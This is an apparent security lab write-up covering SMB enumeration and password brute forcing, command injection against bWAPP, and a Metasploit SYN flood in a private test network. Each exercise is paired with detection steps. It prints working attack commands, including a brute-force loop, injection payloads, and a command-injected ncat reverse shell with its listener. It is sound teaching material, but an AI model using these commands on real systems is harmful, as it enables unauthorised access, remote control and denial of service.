⚙️ Exercise 1: Brute Force Attack Detection via SMB
🛠️ Tools Used
nmap, enum4linux, smbclient

Windows Event Viewer

🔐 Enumeration Steps

nmap -Pn 192.168.0.2
enum4linux 192.168.0.2
smbclient //192.168.0.2/administrator

🔁 Brute Force Script (brute.sh)

#!/bin/bash
for i in {0..20}; do
    echo "Trying password: $i"
    smbclient //192.168.0.2/administrator -U administrator%$i
done

📍 Detection
Logs viewed in: Event Viewer > Microsoft > Windows > SMBServer > Security Logs

Indicators: Multiple failed authentication attempts from 192.168.0.5

⚠️ Exercise 2: Command Injection & Reverse Shell

🔐 Vulnerable Application
bWAPP running on Apache/MySQL via XAMPP on ACIDM01

🔧 Injection Test Commands

www.nsa.gov|netstat -n           # Confirms vulnerability
www.nsa.gov|systeminfo           # Confirms Windows environment
www.nsa.gov|whoami               # Confirm privileges
www.nsa.gov|ncat -h              # Confirms ncat installed

💣 Reverse Shell Command (from bwapp DNS field)
www.nsa.gov|ncat 192.168.0.5 443 -e cmd.exe

🖥️ On Attacker Machine (ACIKALI)
ncat -lvp 443
🧾 Validation
whoami
# Output: aciplab\administrator

🌊 Exercise 3: SYN Flood Attack
🔧 Tool: Metasploit Framework
msfconsole
use auxiliary/dos/tcp/synflood
set RHOST 192.168.0.2
set RPORT 445
run

📍 Detection
Use netstat -n and Task Manager on ACIDM01 to observe abnormal connection volume.

💼 Real-World Relevance

Skill	Real-World Use
SMB Enumeration	Vulnerability scanning, audit defense
Brute Force Attack	Pen testing, failed login monitoring
Command Injection	Web app hardening, DevSecOps
Reverse Shell	Exploitation and incident detection
SYN Flood	Network DoS protection and firewall tuning
